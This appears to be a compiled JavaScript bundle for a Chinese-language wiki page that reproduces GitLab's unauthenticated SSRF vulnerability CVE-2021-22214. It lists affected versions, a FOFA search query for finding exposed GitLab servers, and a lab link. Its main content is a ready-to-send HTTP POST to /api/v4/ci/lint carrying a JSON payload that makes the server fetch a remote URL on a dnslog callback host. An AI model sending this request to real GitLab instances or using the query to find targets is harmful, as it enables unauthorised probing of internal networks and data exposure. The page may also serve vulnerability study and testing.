(window.webpackJsonp=window.webpackJsonp||[]).push([[259],{2182:function(t,a,s){t.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313130516640.c18b8313.png"},2183:function(t,a,s){t.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313130516752.36b69582.png"},2184:function(t,a,s){t.exports=s.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313130516841.a0c002a8.png"},3302:function(t,a,s){"use strict";s.r(a);var e=s(64),n=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"gitlab-ssrf漏洞-cve-2021-22214"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#gitlab-ssrf漏洞-cve-2021-22214"}},[t._v("#")]),t._v(" GitLab SSRF漏洞 CVE-2021-22214")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("GitLab存在前台未授权SSRF漏洞，未授权的攻击者也可以利用该漏洞执行SSRF攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Gitlab > 10.5")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('app="GitLab"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),a("a-alert",{attrs:{type:"success",message:"http://vulfocus.fofa.so",description:"",showIcon:""}}),t._v(" "),a("br"),t._v(" "),a("p",[a("img",{attrs:{src:s(2182),alt:"img"}})]),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("登录页面如下")]),t._v(" "),a("p",[a("img",{attrs:{src:s(2183),alt:"img"}})]),t._v(" "),a("p",[t._v("发送请求包")]),t._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[t._v('POST /api/v4/ci/lint HTTP/1.1\nHost: \nUser-Agent: python-requests/2.25.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Type: application/json\nContent-Length: 111\n\n{"include_merged_yaml": true, "content": "include:\\n  remote: http://965qaw.dnslog.cn/api/v1/targets?test.yml"}\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("p",[a("img",{attrs:{src:s(2184),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);